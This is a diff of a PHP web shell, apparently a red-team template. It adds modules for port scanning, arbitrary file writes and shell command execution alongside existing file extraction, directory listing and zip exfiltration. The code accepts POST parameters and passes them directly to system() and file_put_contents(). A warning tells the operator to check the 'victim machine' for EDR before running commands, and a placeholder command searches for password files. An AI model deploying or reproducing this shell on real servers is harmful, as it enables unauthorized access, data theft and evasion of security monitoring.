@@ -18,28 +18,64 @@ define("FILE_EXTRACTION", "__FEAT_FILE_EXTRACTION__");
 define("DIRECTORY_LISTING", "__FEAT_DIRECTORY_LISTING__");
 define("PERMISSION_CHECK", "__FEAT_PERMISSION_CHECK__");
 define("EXFILTRATE", "__FEAT_EXFILTRATE__");
+define("PORT_SCAN", "__FEAT_PORT_SCAN__");
+define("WRITE_FILE", "__FEAT_WRITE_FILE__");
+define("RUN_COMMAND", "__FEAT_RUN_COMMAND__");
 
 /**
  * Define the enabled features
  *
- * @var array<string, array{title: string, description: string}> $ENABLED_FEATURES
+ * @var array<string, array{title: string, description: string, svg: string}> $ENABLED_FEATURES
  */
 $ENABLED_FEATURES = array(
-    FILE_EXTRACTION   => array(
-        "title"       => "File extraction",
+    FILE_EXTRACTION => array(
+        "title" => "File extraction",
         "description" => "Extract file content as base64.",
+        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
+</svg>',
     ),
     DIRECTORY_LISTING => array(
-        "title"       => "Directory listing",
+        "title" => "Directory listing",
         "description" => "List all files and folders in a directory and optionally its subdirectories.",
+        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
+</svg>',
     ),
-    PERMISSION_CHECK  => array(
-        "title"       => "Permission check",
+    PERMISSION_CHECK => array(
+        "title" => "Permission check",
         "description" => "Check access permission for a folder and its children.",
+        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
+</svg>',
     ),
-    EXFILTRATE        => array(
-        "title"       => "Exfiltrate",
+    EXFILTRATE => array(
+        "title" => "Exfiltrate",
         "description" => "Exfiltrate data from the server in a password protected zip archive.",
+        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
+</svg>',
+    ),
+    PORT_SCAN => array(
+        "title" => "Port scan",
+        "description" => "Scan a given range of TCP ports using connect method.",
+        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
+</svg>',
+    ),
+    WRITE_FILE => array(
+        "title" => "Write file",
+        "description" => "Write a file to the given path, writing permission are required.",
+        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
+</svg>',
+    ),
+    RUN_COMMAND => array(
+        "title" => "Run command",
+        "description" => "Run a system command using the default shell.",
+        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
+</svg>',
     ),
 );
 
@@ -48,8 +84,21 @@ $ENABLED_FEATURES = array(
  *
  * @return bool
  */
-function isPost() {
+function isPost()
+{
     return $_SERVER['REQUEST_METHOD'] === 'POST';
+}
+
+/**
+ * Check if the checkbox is active
+ *
+ * @param $name string Name of the checkbox
+ *
+ * @return bool
+ */
+function isCheckboxActive($name)
+{
+    return isset($_POST[$name]) && $_POST[$name] === "y";
 }
 
 /**
@@ -60,7 +109,8 @@ function isPost() {
  *
  * @return string
  */
-function htmlHighlightActivePage($current_page, $checking_page) {
+function htmlHighlightActivePage($current_page, $checking_page)
+{
     if ($current_page === $checking_page) {
         return "bg-zinc-800 text-white";
     }
@@ -73,10 +123,12 @@ function htmlHighlightActivePage($current_page, $checking_page) {
  * @param $page string Page to link to
  * @param $current_page string Current page to highlight
  * @param $label string Label to display
+ * @param $svg string Icon to display
  *
  * @return string
  */
-function makeNavLink($page, $current_page, $label) {
+function makeNavLink($page, $current_page, $label, $svg)
+{
     ob_start();
     ?>
     <li>
@@ -86,6 +138,9 @@ function makeNavLink($page, $current_page, $label) {
            "
            id="nav-<?php echo $page ?>"
         >
+            <div class="flex items-center justify-center">
+                <?php echo $svg; ?>
+            </div>
             <?php echo $label ?>
         </a>
     </li>
@@ -101,7 +156,8 @@ function makeNavLink($page, $current_page, $label) {
  *
  * @return string
  */
-function makePageHeader($title, $description) {
+function makePageHeader($title, $description)
+{
     ob_start();
     ?>
     <div class="lg:flex lg:items-center lg:justify-between">
@@ -138,7 +194,8 @@ function makePageHeader($title, $description) {
  *
  * @return string
  */
-function makeInput($type, $label, $name, $placeholder, $description, $required = false) {
+function makeInput($type, $label, $name, $placeholder, $description, $required = false)
+{
     ob_start();
     if ($type !== "textarea") {
         ?>
@@ -166,8 +223,7 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
             </p>
         </div>
         <?php
-    }
-    else {
+    } else {
         ?>
         <div class="flex flex-col gap-y-2">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
@@ -208,7 +264,8 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
  *
  * @return string
  */
-function makeCheckbox($name, $label, $description, $value = "y") {
+function makeCheckbox($name, $label, $description, $value = "y")
+{
     ob_start();
     ?>
     <div class="relative flex items-start">
@@ -233,16 +290,19 @@ function makeCheckbox($name, $label, $description, $value = "y") {
 /**
  * Create a form with the given elements
  *
+ * @param $operation string Operation to perform when the form is submitted
  * @param $action string Action to perform when the form is submitted
  * @param $elements string[] Elements to include in the form
  * @param $method string Method to use for the form, default is "post"
  *
  * @return string
  */
-function makeForm($action, $elements, $method = "post") {
+function makeForm($operation, $action, $elements, $method = "post")
+{
     ob_start();
     ?>
     <form action="<?php echo $action ?>" method="<?php echo $method ?>" class="flex flex-col gap-y-6 max-w-xl mt-8">
+        <input type="hidden" name="__OPERATION__" value="<?php echo $operation ?>"/>
         <?php
         foreach ($elements as $element) {
             echo $element;
@@ -266,7 +326,8 @@ function makeForm($action, $elements, $method = "post") {
  *
  * @return string
  */
-function makePage($elements, $current_page) {
+function makePage($elements, $current_page)
+{
     global $ENABLED_FEATURES;
     ob_start();
     ?>
@@ -288,7 +349,7 @@ function makePage($elements, $current_page) {
                         <ul role="list" class="-mx-2">
                             <?php
                             foreach ($ENABLED_FEATURES as $feature => $definition) {
-                                echo makeNavLink($feature, $current_page, $definition["title"]);
+                                echo makeNavLink($feature, $current_page, $definition["title"], $definition["svg"]);
                             }
                             ?>
                         </ul>
@@ -319,7 +380,8 @@ function makePage($elements, $current_page) {
  *
  * @return string
  */
-function makeCodeHighlight($code) {
+function makeCodeHighlight($code)
+{
     ob_start();
     ?>
     <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
@@ -327,13 +389,87 @@ function makeCodeHighlight($code) {
     return ob_get_clean();
 }
 
+/**
+ * Create an alert element on the page
+ * @param $title string Title of the alert box
+ * @param $message string Message of the alert
+ * @return string
+ */
+function makeAlert($title, $message)
+{
+    ob_start();
+    ?>
+    <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
+        <div class="flex items-start justify-center text-yellow-600">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                 stroke="currentColor" class="w-8 h-8">
+                <path stroke-linecap="round" stroke-linejoin="round"
+                      d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z"/>
+            </svg>
+        </div>
+        <div class="flex flex-col">
+            <h3 class="text-sm leading-7 font-semibold">
+                <?php echo $title; ?>
+            </h3>
+            <p class="text-sm">
+                <?php echo $message; ?>
+            </p>
+        </div>
+    </div>
+    <?php
+    return ob_get_clean();
+}
+
+/**
+ * Open the command output screen where output can be freely written
+ * @return void
+ */
+function openCommandOutputScreen()
+{
+    ?>
+<div class="ml-72 py-10">
+    <div class="container px-16">
+    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-2">
+    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-7">
+        Command output
+    </h3>
+    <pre class="p-2"><?php
+}
+
+/**
+ * Closes the command output screen
+ * @return void
+ */
+function closeCommandOutputScreen()
+{
+    ?></pre>
+    </div>
+    </div>
+    </div>
+    <?php
+}
+
+/**
+ * Output data to the command output screen
+ * @param string|array $data Data to output
+ * @return void
+ */
+function out($data)
+{
+    if (is_array($data)) {
+        $data = implode("\n", $data);
+    }
+    echo "$data\n";
+    flush();
+}
+
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
-$isolated_ops = array(FILE_EXTRACTION,);
+$isolated_ops = array(EXFILTRATE,);
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
-if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
-    $page = isset($_GET['page']) ? $_GET['page'] : '';
+if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
+    $page = isset($_GET['page']) ? $_GET['page'] : FILE_EXTRACTION;
 
     $content = "";
 
@@ -346,6 +482,7 @@ if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
+                        $page,
                         $_SERVER["REQUEST_URI"],
                         array(
                             makeInput(
@@ -380,6 +517,7 @@ if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
+                        $page,
                         $_SERVER["REQUEST_URI"],
                         array(
                             makeInput(
@@ -414,6 +552,7 @@ if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
+                        $page,
                         $_SERVER["REQUEST_URI"],
                         array(
                             makeInput(
@@ -438,6 +577,7 @@ if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         $ENABLED_FEATURES[$page]["description"]
                     ),
                     makeForm(
+                        $page,
                         $_SERVER["REQUEST_URI"],
                         array(
                             makeInput(
@@ -452,12 +592,117 @@ if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 " to include only files with the given extensions.",
                                 true
                             ),
+                        )
+                    ),
+                ),
+                $page
+            );
+            break;
+        case PORT_SCAN:
+            $content = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        array(
                             makeInput(
-                                "password",
-                                "Password",
+                                "text",
+                                "Host",
+                                "__PARAM_1__",
+                                "localhost",
+                                "The host to connect to",
+                                true
+                            ),
+                            makeInput(
+                                "number",
+                                "Starting port",
                                 "__PARAM_2__",
-                                "password",
-                                "Password to protect the zip archive.",
+                                "1",
+                                "Starting port of the scan (included)",
+                                true
+                            ),
+                            makeInput(
+                                "number",
+                                "Ending port",
+                                "__PARAM_3__",
+                                "65535",
+                                "Ending port of the scan (included)",
+                                true
+                            ),
+                        )
+                    ),
+                ),
+                $page
+            );
+            break;
+        case WRITE_FILE:
+            $content = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        array(
+                            makeInput(
+                                "text",
+                                "Path",
+                                "__PARAM_1__",
+                                "C://path/to/file.txt",
+                                "Fully qualified path where the file will be written.",
+                                true
+                            ),
+                            makeInput(
+                                "textarea",
+                                "File content",
+                                "__PARAM_2__",
+                                "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
+                                "Content of the file to write to disk.",
+                                true
+                            ),
+                            makeCheckbox(
+                                "__PARAM_3__",
+                                "Decode from base64",
+                                "Decode the content of the file from base64 before writing it to disk."
+                            ),
+                        )
+                    ),
+                ),
+                $page
+            );
+            break;
+        case RUN_COMMAND:
+            $content = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeAlert(
+                        "Running system commands",
+                        "Running system commands results in the creation of a child process from the 
+                        webserver/php process (aka a new terminal is spawned), this behaviour as you may expect can be 
+                        easily detected by EDR and other security solutions.
+                        <br/>
+                        If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
+                        victim machine and ensure that there is no security solution running before using this module."
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        array(
+                            makeInput(
+                                "textarea",
+                                "Command",
+                                "__PARAM_1__",
+                                "ls -lah | grep pass",
+                                "Command to run through the default system shell. This can be used to establish a full duplex tunnel between the attacker and the victim machine.",
                                 true
                             ),
                         )
@@ -469,69 +714,18 @@ if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
     }
 
     echo $content;
-    ?>
-    <!--
-    <form action="<?php /*echo $_SERVER["REQUEST_URI"] */ ?>" method="post">
-    <div class="flex">
-    <label for="op">Which operation to run?</label>
-    <select id="op" name="op">
-    <option value="zip_multiple_recursive">Zip multiple files/folder</option>
-    <option value="port_scan">Port scanner</option>
-    <option value="write_file">Write file</option>
-    </select>
-    </div>
-    <div class="hidden" id="zip_multiple_recursive">
-    <hr/>
-    <div>
-    <label for="zip_multiple_content">List of file/folders to include in the zip archive, optionally
-    concatenate to the path <code>,with_tree</code> to include all files and folders within a given
-    directory: </label>
-    <br/>
-    <br/>
-    <textarea id="zip_multiple_content" name="zip_multiple_content" rows="10"></textarea>
-    <br/>
-    <br/>
-    </div>
-    </div>
-    <div class="hidden" id="port_scan">
-        <hr/>
-        <div class="flex">
-            <label for="port_scan_host">Host: </label>
-            <input id="port_scan_host" name="port_scan_host" type="text">
-        </div>
-        <div class="flex">
-            <label for="port_scan_start_port">Start port (min: 1): </label>
-            <input id="port_scan_start_port" name="port_scan_start_port" type="number">
-        </div>
-        <div class="flex">
-            <label for="port_scan_end_port">End port (max: 65535): </label>
-            <input id="port_scan_end_port" name="port_scan_end_port" type="number">
-        </div>
-    </div>
-    <div class="hidden" id="write_file">
-        <hr/>
-        <div class="flex">
-            <label for="write_file_path">Path: </label>
-            <input id="write_file_path" name="write_file_path" type="text">
-        </div>
-        <div class="flex">
-            <label for="write_file_content">Content: </label>
-            <textarea id="write_file_content" name="write_file_content"></textarea>
-        </div>
-    </div>
-    <input type="submit" value="Submit"/>
-    </form>
 
-    <pre>-->
-    <?php
-    // Exit the html rendering block
+    if (isPost()) {
+        openCommandOutputScreen();
+    }
 }
 
 ///////////////////////
 // CODE BLOCK START  //
 ///////////////////////
 
-function check_and_print_file($filepath, $preview = "n", $export = "n") {
+function check_and_print_file($filepath, $preview = "n", $export = "n")
+{
     if (!file_exists($filepath)) {
         echo "Error: File '$filepath' does not exist.\n";
         return;
@@ -543,13 +737,12 @@ function check_and_print_file($filepath, $preview = "n", $export = "n") {
         $content = file_get_contents($filepath);
         echo "File size: " . $filesize . " bytes\n";
         echo "Base64 content:\n" . base64_encode($content) . "\n";
-    }
-    else {
+    } else {
         echo "File size: " . $filesize . " bytes (exceeds 100Kb).\n";
 
         if (strtolower($preview) === 'y') {
             $preview_content = fopen($filepath, "r");
-            $read            = fread($preview_content, 10240); // Read 10Kb
+            $read = fread($preview_content, 10240); // Read 10Kb
             fclose($preview_content);
             echo "Preview:\n" . $read . "\n";
         }
@@ -562,13 +755,14 @@ function check_and_print_file($filepath, $preview = "n", $export = "n") {
     }
 }
 
-function zip_folder_base64($folder_path, $allowed_extensions = []) {
+function zip_folder_base64($folder_path, $allowed_extensions = array())
+{
     if (!is_dir($folder_path)) {
         echo "Error: '$folder_path' is not a directory.";
         return;
     }
 
-    $zip      = new ZipArchive();
+    $zip = new ZipArchive();
     $zip_name = tempnam(sys_get_temp_dir(), ''); // Generate temporary zip filename
     $zip->open($zip_name, ZipArchive::CREATE);
 
@@ -581,10 +775,10 @@ function zip_folder_base64($folder_path, $allowed_extensions = []) {
         if ($file->isDir()) {
             continue;
         }
-        $filePath     = $file->getRealPath();
+        $filePath = $file->getRealPath();
         $relativePath = str_replace($folder_path . DIRECTORY_SEPARATOR, '', $filePath);
 
-        $fileInfo  = new SplFileInfo($filePath);
+        $fileInfo = new SplFileInfo($filePath);
         $extension = strtolower($fileInfo->getExtension());
 
         if (empty($allowed_extensions) || in_array($extension, $allowed_extensions)) {
@@ -600,15 +794,15 @@ function zip_folder_base64($folder_path, $allowed_extensions = []) {
     return base64_encode($zip_data);
 }
 
-function getDirContents($dir, &$results = []) {
+function getDirContents($dir, &$results = array())
+{
     $files = scandir($dir);
 
     foreach ($files as $key => $value) {
         $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
         if (!is_dir($path)) {
             $results[] = $path;
-        }
-        else {
+        } else {
             if ($value != "." && $value != "..") {
                 getDirContents($path, $results);
                 $results[] = $path;
@@ -619,15 +813,16 @@ function getDirContents($dir, &$results = []) {
     return $results;
 }
 
-function check_permissions($path) {
+function check_permissions($path)
+{
     if (!is_readable($path)) {
         echo "Error: Cannot access '$path' (no read permission).\n";
         return;
     }
 
-    $perms      = fileperms($path);
-    $readable   = ($perms & 0444) ? 'R' : '-';                   // Check read bits
-    $writable   = ($perms & 0222) ? 'W' : '-';                   // Check write bits
+    $perms = fileperms($path);
+    $readable = ($perms & 0444) ? 'R' : '-';                   // Check read bits
+    $writable = ($perms & 0222) ? 'W' : '-';                   // Check write bits
     $executable = ($perms & 0111) && !is_dir($path) ? 'X' : '-'; // Check execute bits (only for files)
 
     echo "$path: $readable$writable$executable\n";
@@ -639,8 +834,7 @@ function check_permissions($path) {
                 $sub_path = "$path/$file";
                 if (is_readable($sub_path)) {
                     echo "- $sub_path\n";
-                }
-                else {
+                } else {
                     echo "- (No read permission for $sub_path)\n";
                 }
             }
@@ -649,7 +843,8 @@ function check_permissions($path) {
     }
 }
 
-function get_shortest_common_path($paths) {
+function get_shortest_common_path($paths)
+{
     if (empty($paths)) {
         return null;
     }
@@ -657,16 +852,15 @@ function get_shortest_common_path($paths) {
     $shortest_path = $paths[0]; // Initialize with first path
 
     foreach ($paths as $path) {
-        $common_path       = '';
-        $path_segments     = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
+        $common_path = '';
+        $path_segments = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
         $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));
 
         $min_length = min(count($path_segments), count($shortest_segments));
         for ($i = 0; $i < $min_length; $i++) {
             if ($path_segments[$i] === $shortest_segments[$i]) {
                 $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
-            }
-            else {
+            } else {
                 break;
             }
         }
@@ -677,35 +871,50 @@ function get_shortest_common_path($paths) {
     return rtrim($shortest_path, DIRECTORY_SEPARATOR); // Remove trailing separator if present
 }
 
-function create_zip($content) {
-    $zip      = new ZipArchive();
-    $zip_name = tempnam(sys_get_temp_dir(), 'archive');
+/**
+ * Handle the zip creation process
+ * @return void
+ */
+function handleCreateZip()
+{
+    $content = $_POST['__PARAM_1__'];
 
-    if ($zip->open($zip_name, ZipArchive::CREATE) !== true) {
+    $zip = new ZipArchive();
+    $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");
+
+    if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
         echo "Error: Could not create temporary archive.";
         return;
     }
 
-    $lines            = explode("\n", $content);
+    $lines = explode("\n", $content);
     $path_replacement = get_shortest_common_path($lines);
     foreach ($lines as $line) {
-        $parts     = explode(',', trim($line)); // Split line by comma
-        $path      = isset($parts[0]) ? $parts[0] : '';
-        $recursive = isset($parts[1]) && strtolower($parts[1]) === 'with_tree';
+        $parts = explode(',', trim($line)); // Split line by comma
+        $path = isset($parts[0]) ? $parts[0] : '';
+
+        $recursive = in_array('with_tree', $parts);
+        $extensions = array();
+
+        foreach ($parts as $part) {
+            if (strpos($part, 'extension=') === 0) {
+                $extensions = explode("|", strtolower(trim(substr($part, 10))));
+                break;
+            }
+        }
 
         if ($path) {
-            if (is_file($path)) {
+            if (
+                is_file($path) &&
+                ($extensions === array() || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
+            ) {
                 $zip->addFile(
                     $path,
                     preg_replace("^\\\\", "", str_replace('\\', '/', basename($path)))
                 ); // Add file with original name
-            }
-            else {
+            } else {
                 if (is_dir($path) && is_readable($path)) {
-                    add_directory_to_zip($path, $zip, $recursive, $path_replacement . DIRECTORY_SEPARATOR);
-                }
-                else {
-                    //echo "Error: '$path' is not a valid file or readable directory.\n";
+                    addDirectoryToZip($path, $zip, $recursive, $extensions, $path_replacement . DIRECTORY_SEPARATOR);
                 }
             }
         }
@@ -713,7 +922,7 @@ function create_zip($content) {
 
     $zip->close();
 
-    $file_size  = filesize($zip_name);
+    $file_size = filesize($zip_name);
     $chunk_size = 4096; // Adjust chunk size as needed
 
     header('Content-Description: File Transfer');
@@ -734,12 +943,27 @@ function create_zip($content) {
     unlink($zip_name); // Delete temporary zip file;
 }
 
-function add_directory_to_zip($dir, $zip, $recursive, $cleanup_path = "") {
+/**
+ * Add a directory to a zip archive
+ * @param $dir string Directory to add
+ * @param $zip ZipArchive Zip archive to add to
+ * @param $recursive bool Whether to add the directory recursively
+ * @param $extensions string[] Extensions to include
+ * @param $cleanup_path string Path to cleanup
+ * @return void
+ */
+function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "")
+{
     $dir_handle = opendir($dir);
+
     while (($file = readdir($dir_handle)) !== false) {
         if ($file !== '.' && $file !== '..') {
             $sub_path = "$dir/$file";
-            if (is_file($sub_path)) {
+
+            if (
+                is_file($sub_path) &&
+                ($extensions === array() || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
+            ) {
                 $zip->addFile(
                     $sub_path,
                     preg_replace(
@@ -748,18 +972,29 @@ function add_directory_to_zip($dir, $zip, $recursive, $cleanup_path = "") {
                         str_replace('\\', '/', str_replace($cleanup_path, '', $sub_path))
                     )
                 ); // Add with relative path within zip
-            }
-            else {
+            } else {
                 if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
-                    add_directory_to_zip($sub_path, $zip, $recursive, $cleanup_path);
+                    addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
                 }
             }
         }
     }
+
     closedir($dir_handle);
 }
 
-function portScan($host, $startPort, $endPort) {
+/**
+ * Handle the port scan operation
+ * @return void
+ */
+function handlePortScan()
+{
+    $host = $_POST['__PARAM_1__'];
+    $startPort = intval($_POST['__PARAM_2__']);
+    $endPort = intval($_POST['__PARAM_3__']);
+
+    out("Scanning ports $startPort to $endPort on $host...");
+
     // Loop through the port range
     for ($port = $startPort; $port <= $endPort; $port++) {
         // Attempt to connect to the host on the current port
@@ -769,68 +1004,65 @@ function portScan($host, $startPort, $endPort) {
         if ($socket) {
             // The port is open
             fclose($socket);
-            echo "Port $port: OPEN\n";
-        }
-        else {
+            out("Port $port: OPEN");
+        } else {
             // The port is closed or unreachable
-            echo "Port $port: CLOSED / UNREACHABLE (err: $errstr)\n";
+            out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
         }
         flush();
     }
 }
 
-function appendOperationRedirector($operation) {
-    echo "<script>
-        // NOTE: This will run before the onload script
-        const url = new URL(window.location)
-        url.searchParams.set('page', '$operation')
-        window.history.pushState(window.history.state, '', url.href)
-    </script>";
+/**
+ * Handle the write file operation
+ * @return void
+ */
+function handleWriteFile()
+{
+    $filename = $_POST['__PARAM_1__'];
+    $should_decode_from_b64 = isCheckboxActive("__PARAM_3__");
+    $content = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
+
+    out(array(
+        "Received content of length " . strlen($content) . " bytes.",
+        "Writing to $filename ..."
+    ));
+
+    file_put_contents($filename, $content);
+    out("File written successfully.");
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $operation = $_POST["op"];
+if (isPost()) {
+    $operation = $_POST["__OPERATION__"];
 
     switch ($operation) {
-        case "file_extraction":
+        case FILE_EXTRACTION:
             check_and_print_file(
-                $_POST["file_extraction_filepath"],
-                $_POST["file_extraction_preview"],
-                $_POST["file_extraction_export"]
+                $_POST["__PARAM_1__"],
+                $_POST["__PARAM_2__"],
+                $_POST["__PARAM_3__"]
             );
-            appendOperationRedirector($operation);
             break;
-        case "folder_export":
-            $base64_zip = zip_folder_base64(
-                $_POST["folder_export_pathname"],
-                explode(",", $_POST["folder_export_extensions"])
-            );
-            echo "Folder zipped as base64:\n" . $base64_zip;
-            appendOperationRedirector($operation);
-            break;
-        case "dir_listing":
-            $result = getDirContents($_POST["dir_listing_pathname"]);
+        case DIRECTORY_LISTING:
+            $result = getDirContents($_POST["__PARAM_1__"]);
             foreach ($result as $e) {
                 echo "$e\n";
             }
-            appendOperationRedirector($operation);
             break;
-        case "folder_perm_check":
-            check_permissions($_POST["folder_perm_check_pathname"]);
-            appendOperationRedirector($operation);
+        case PERMISSION_CHECK:
+            check_permissions($_POST["__PARAM_1__"]);
             break;
-        case "zip_multiple_recursive":
-            $content = trim($_POST['zip_multiple_content']);
-            create_zip($content);
-            appendOperationRedirector($operation);
+        case EXFILTRATE:
+            handleCreateZip();
             break;
-        case "port_scan":
-            portScan($_POST['port_scan_host'], $_POST['port_scan_start_port'], $_POST['port_scan_end_port']);
-            appendOperationRedirector($operation);
+        case PORT_SCAN:
+            handlePortScan();
             break;
-        case "write_file":
-            file_put_contents($_POST['write_file_path'], $_POST['write_file_content']);
-            appendOperationRedirector($operation);
+        case WRITE_FILE:
+            handleWriteFile();
+            break;
+        case RUN_COMMAND:
+            system($_POST["__PARAM_1__"]);
             break;
         default:
             echo "Unrecognized operation '$operation'";
@@ -840,10 +1072,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
 if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
-    ?>
-    </pre>
-    </body>
-    </html>
-    <?php
+    closeCommandOutputScreen();
 }
 ?>
